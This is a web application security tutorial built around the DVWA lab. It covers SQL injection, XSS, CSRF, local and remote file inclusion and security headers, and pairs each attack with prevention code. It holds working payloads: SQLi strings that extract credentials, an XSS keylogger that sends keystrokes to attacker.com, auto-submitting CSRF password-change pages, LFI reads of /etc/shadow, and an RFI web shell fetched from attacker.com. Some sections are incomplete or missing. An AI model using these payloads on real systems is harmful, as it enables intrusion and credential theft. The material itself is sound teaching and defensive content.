1. SQL Injection Attacks
1.1 Understanding SQL Injection
What is SQL Injection?
SQL Injection is a web security vulnerability that allows attackers to interfere with the queries an application makes to its database. It typically allows an attacker to view data that they are not normally able to retrieve.

How SQL Injection Works
sql
-- Normal query
SELECT * FROM users WHERE username = 'admin' AND password = 'password'

-- Injected query
SELECT * FROM users WHERE username = 'admin' OR 1=1--' AND password = 'anything'
1.2 Types of SQL Injection
1. Classic SQL Injection
sql
-- Login bypass
' OR '1'='1
' OR 1=1--
' OR 1=1#

-- Union-based
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
2. Blind SQL Injection
sql
-- Boolean-based blind
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a
' AND (SELECT COUNT(*) FROM users) > 0

-- Time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
3. Error-based SQL Injection
sql
-- Extract data through error messages
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

Step 4: Extract Table Information

Step 5: Extract User Credentials
sql
-- Get usernames and passwords
' UNION SELECT user,password FROM users--

-- Get specific user
' UNION SELECT user,password FROM users WHERE user='admin'--
1.4 SQL Injection Prevention
Parameterized Queries (Prepared Statements)
php
// Vulnerable code
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

// Secure code using prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $username, 'password' => $password]);
Input Validation and Sanitization
php
// Input validation
if (!preg_match("/^[a-zA-Z0-9_]+$/", $username)) {
    die("Invalid username format");
}

// Input sanitization
$username = mysqli_real_escape_string($conn, $username);
Additional Security Measures
Use stored procedures

Implement principle of least privilege

2. Cross-Site Scripting (XSS)
2.1 Understanding XSS
What is XSS?
Cross-Site Scripting (XSS) attacks enable attackers to inject client-side scripts into web pages viewed by other users.

XSS Impact
Session hijacking

Defacement of websites

Identity theft

Malware distribution

2.2 Types of XSS
1. Stored (Persistent) XSS
Malicious script is permanently stored on target server

Affects all users viewing the vulnerable page

Most dangerous type

2. Reflected (Non-Persistent) XSS
Malicious script is reflected off web server

Requires user to click specially crafted link

Typically delivered via phishing

3. DOM-based XSS
Vulnerability exists in client-side code

No server interaction required

Executed by modifying DOM environment

2.3 Practical XSS Attacks on DVWA
Stored XSS Attack
html
<!-- Inject into comment/guestbook field -->

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>
Reflected XSS Attack
html
<!-- Through search parameter -->

<!-- Advanced payload -->

<body onload=alert(1)>

php

3. Cross-Site Request Forgery (CSRF)
3.1 Understanding CSRF
What is CSRF?
Cross-Site Request Forgery tricks a victim into submitting a malicious request. It uses the identity and privileges of the victim to perform an undesired function.

CSRF Attack Flow
User logs into vulnerable application

User visits malicious website

Malicious site sends request to vulnerable application

Request executes with user's privileges

3.2 Practical CSRF Attack on DVWA
Creating CSRF Attack Page
html
<!-- malicious.html -->
<html>
<body>
    <form action="http://192.168.56.102/DVWA/vulnerabilities/csrf/" method="POST">
        <input type="hidden" name="password_new" value="hacked123">
        <input type="hidden" name="password_conf" value="hacked123">
        <input type="hidden" name="Change" value="Change">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
Advanced CSRF with Image Tag
html
<!-- Using image tag -->
<img src="http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">

<!-- Using JavaScript fetch -->
<script>
fetch('http://192.168.56.102/DVWA/vulnerabilities/csrf/', {
    method: 'POST',
    credentials: 'include',
    body: 'password_new=hacked&password_conf=hacked&Change=Change'
});
</script>
3.3 CSRF Prevention
Anti-CSRF Tokens
php
// Generate token
$csrf_token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $csrf_token;

// Include in form
<input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">

// Validate token
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF token validation failed");
}
SameSite Cookies
php
setcookie("session", $session_id, [
    'samesite' => 'Strict',
    'secure' => true,
    'httponly' => true
]);
Additional Protection
Check Referer header

Require re-authentication for sensitive actions

Use custom headers for AJAX requests

4. File Inclusion Vulnerabilities
4.1 Understanding File Inclusion
Types of File Inclusion
Local File Inclusion (LFI): Include local files on server

Remote File Inclusion (RFI): Include remote files from external servers

4.2 LFI Attacks
Basic LFI
php
// Vulnerable code
include($_GET['page'] . '.php');

// Attack
?page=../../../../etc/passwd
?page=../../../../etc/shadow
?page=../../../../var/log/auth.log
LFI to RCE (Remote Code Execution)
php
// Through log poisoning
?page=../../../../var/log/apache2/access.log

// Inject PHP code into User-Agent
// Then include the log file to execute code

// Through /proc/self/environ
?page=../../../../proc/self/environ
PHP Wrapper Attacks
php
// PHP filter to read source code
?page=php://filter/convert.base64-encode/resource=index

// Data wrapper for code execution
?page=data://text/plain,<?php system('id');?>

// Expect wrapper (if enabled)
?page=expect://ls
4.3 RFI Attacks
Basic RFI
php
// Vulnerable code
include($_GET['page']);

// Attack
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.php
Creating Malicious Payload
php
// shell.txt content
<?php system($_GET['cmd']); ?>

// Access with
?page=http://attacker.com/shell.txt&cmd=id
4.4 File Inclusion Prevention
Input Validation
php
// Whitelist approach
$allowed_pages = ['home', 'about', 'contact'];
if (!in_array($_GET['page'], $allowed_pages)) {
    die("Invalid page requested");
}

// Remove path traversal characters
$page = str_replace(['../', '..\\', '/', '\\'], '', $_GET['page']);
Secure Configuration
Disable allow_url_fopen and allow_url_include

Use open_basedir restriction

Implement proper file permissions

Regular security updates

6. Security Headers Implementation
6.1 Essential Security Headers
Content Security Policy (CSP)
http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline'
HTTP Strict Transport Security (HSTS)
http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options
http
X-Content-Type-Options: nosniff
X-Frame-Options
http
X-Frame-Options: DENY
# or
X-Frame-Options: SAMEORIGIN
X-XSS-Protection
http
X-XSS-Protection: 1; mode=block
Referrer-Policy
http
Referrer-Policy: strict-origin-when-cross-origin
6.2 Implementing Security Headers in Apache
.htaccess Configuration
apache
# Security Headers
Header always set Content-Security-Policy "default-src 'self';"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "1; mode=block"
Header always set Referrer-Policy "strict-origin-when-cross-origin"

# Remove sensitive headers
Header unset X-Powered-By
Header unset Server
Virtual Host Configuration
apache
<VirtualHost *:443>
    ServerName example.com
    
    # SSL Configuration
    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/private.key
    
    # Security Headers
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-Frame-Options "DENY"
</VirtualHost>
